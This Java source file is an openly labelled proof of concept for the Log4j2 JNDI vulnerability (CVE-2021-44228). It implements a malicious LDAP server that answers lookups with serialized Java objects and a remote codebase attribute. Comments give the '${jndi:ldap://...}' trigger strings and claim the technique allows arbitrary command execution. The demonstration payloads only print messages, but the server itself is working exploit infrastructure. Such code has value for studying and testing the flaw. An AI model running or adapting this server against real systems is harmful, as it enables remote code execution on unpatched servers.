package com.logbasex.ldapserver;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.InetAddress;
import java.util.Objects;
import java.util.logging.ConsoleHandler;

/**
 * This is a proof of concept implementation of CVE-2021-44228 (https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
 */
public class LDAPServer {
	public static class ROFL implements Serializable {
		
		static {
			System.out.println("ROFL CINIT!");
		}
		
		public ROFL() {
			System.out.println("ROFL CTOR!");
		}
		
		@Override public String toString() {
			System.out.println("ROFL TOSTRING!");
			return "ROFL!";
		}
	}

	public static void main(String... args) {
		final int port = 1389;

		try {
			final InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=exploit,dc=com");

			config.setListenerConfigs(new InMemoryListenerConfig("exploit", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
			config.addInMemoryOperationInterceptor(new OperationInterceptor());
			config.setAccessLogHandler(new ConsoleHandler());

			final InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);

			System.out.println("[+] LDAP Server Start Listening on " + port + " ....");

			server.startListening();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	private static final class OperationInterceptor extends InMemoryOperationInterceptor {

		@Override public void processSearchResult(InMemoryInterceptedSearchResult result) {
			try {
				final String baseDn = result.getRequest().getBaseDN();
				
				System.out.println("[+] Received LDAP Query: " + baseDn);
				
				sendSerializedResult(result, new Entry(baseDn));
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		// Works only if the system property com.sun.jndi.ldap.object.trustURLCodebase is true
		// ${jndi:ldap://127.0.0.1/exe}
		private void sendExeResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException, ClassNotFoundException {
			final ROFL send = new ROFL();
			final String location = Objects.requireNonNull(LDAPServer.class.getResource("")).toString();

			final ByteArrayOutputStream serializedStream = new ByteArrayOutputStream();
			final ObjectOutputStream objectStream = new ObjectOutputStream(serializedStream);
			objectStream.writeObject(send);
			serializedStream.flush();

			entry.addAttribute("javaClassName", send.getClass().getName());
			entry.addAttribute("javaCodebase", location);
			entry.addAttribute("javaSerializedData", serializedStream.toByteArray());

			result.sendSearchEntry(entry);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}

		// Works all the time
		// ${jndi:ldap://127.0.0.1/a}
		private void sendSerializedResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException {
			final String send = "Logbasex had entered your house through a Apache Log4j2 Vulnerability.";

			final ByteArrayOutputStream serializedStream = new ByteArrayOutputStream();
			final ObjectOutputStream objectStream = new ObjectOutputStream(serializedStream);
			objectStream.writeObject(send);
			serializedStream.flush();

			entry.addAttribute("javaClassName", send.getClass().getName());
			entry.addAttribute("javaSerializedData", serializedStream.toByteArray());

			//this allows an attacker to execute "arbitrary code/command" like remove file, shutdown server, etc.
			result.sendSearchEntry(entry);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}
	}
}
